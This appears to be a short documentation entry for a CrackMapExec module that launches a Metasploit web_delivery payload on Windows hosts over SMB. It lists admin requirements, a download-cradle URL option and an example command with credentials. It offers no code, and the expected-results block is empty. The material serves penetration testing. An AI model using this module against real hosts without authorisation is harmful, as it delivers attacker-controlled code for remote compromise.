Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module  

Multiple_Host | Requires LA | Requires DA | Opsec_safe
|---|---|---|---|
true | true | false | true 

**Options:**
```
    URL  URL for the download cradle
```
**Example Usage:**
```
~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M web_delivery
```
**Expected Results:**
```

~# 
```
--------------------------------------------------------------------------------------------------------------------------------------------------------

